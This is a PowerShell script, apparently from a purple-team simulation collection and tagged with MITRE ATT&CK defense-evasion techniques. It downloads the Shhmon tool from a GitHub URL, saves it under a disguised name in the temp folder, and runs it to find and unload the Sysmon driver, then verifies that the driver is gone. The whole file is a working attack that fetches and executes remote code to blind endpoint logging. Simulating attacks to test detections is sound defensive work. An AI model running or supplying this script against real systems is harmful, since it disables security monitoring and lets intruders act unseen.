<#
    T1562.006 - Impair Defenses: Indicator Blocking
    T1562.002 - Impair Defenses: Disable Windows Event Logging
    T1562.001 - Impair Defenses: Disable or Modify Tools
    Unload Sysmon driver with Shhmon, allow the attacker to bypass sysmon detections (most of it, network monitoring will still be effective)
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

$outfile = "$env:tmp\Sysmonk.exe"
$url = "https://github.com/mthcht/Purpleteam/blob/main/Simulation/Windows/_bin/Shhmon.exe?raw=true"

try{
    Invoke-WebRequest $url -OutFile $outfile
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: Shhmon downloaded to $outfile"
        Write-Host -ForegroundColor Cyan "Hunting sysmon with hunt argument..." 
        & $outfile hunt 
        Write-Host -ForegroundColor Cyan "Unloading Sysmon driver SysmonDrv"
        & $outfile kill 
        if(fltmc.exe | Select-String "385201","Sysmon"){
            Write-Host -ForegroundColor Red "Error: Shhmon did not unload Sysmon driver"
        }
        else{
            Write-Host -ForegroundColor Green "Sucess: Sysmon driver not found, Shhmon unloaded Sysmon driver successfully"
        }
    }
    else{
        Write-Host -ForegroundColor Red "Error Download: Shhmon not found in $outfile"
    }

}
catch{
    Write-Error $_
}

Stop-Transcript
